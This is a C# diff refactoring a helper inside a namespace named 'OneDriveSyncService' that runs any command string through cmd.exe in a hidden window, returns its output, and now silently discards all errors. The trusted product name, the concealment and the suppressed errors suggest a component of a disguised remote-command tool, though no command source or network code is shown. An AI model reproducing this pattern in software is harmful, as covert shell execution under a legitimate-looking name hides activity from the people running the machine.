@@ -9,34 +9,39 @@ namespace OneDriveSyncService
         {
             try
             {
-                string returns = "";
+                string output = "";
 
                 Process cmdProc = PrepCmd(command);
 
                 cmdProc.Start();
 
-                returns += cmdProc.StandardOutput.ReadToEnd();
-                returns += cmdProc.StandardError.ReadToEnd();
+                output += cmdProc.StandardOutput.ReadToEnd();
+                output += cmdProc.StandardError.ReadToEnd();
 
-                return returns;
+                return output;
             }
-            catch (Exception ex)
+            catch
             {
-                return ex.Message.ToString() + Environment.NewLine;
+                // Manejo silencioso de excepciones
+                return string.Empty;
             }
-
         }
 
-        static Process PrepCmd (string command)
+        static Process PrepCmd(string command)
         {
-            Process cmdProc = new Process();
-            cmdProc.StartInfo.FileName = "cmd.exe";
-            cmdProc.StartInfo.Arguments = "/c " + command;
-            cmdProc.StartInfo.UseShellExecute = false;
-            cmdProc.StartInfo.CreateNoWindow = true;
-            cmdProc.StartInfo.WorkingDirectory = Environment.CurrentDirectory;
-            cmdProc.StartInfo.RedirectStandardOutput = true;
-            cmdProc.StartInfo.RedirectStandardError = true;
+            Process cmdProc = new Process
+            {
+                StartInfo = new ProcessStartInfo
+                {
+                    FileName = "cmd.exe",
+                    Arguments = "/c " + command,
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                    WorkingDirectory = Environment.CurrentDirectory,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true
+                }
+            };
             return cmdProc;
         }
     }
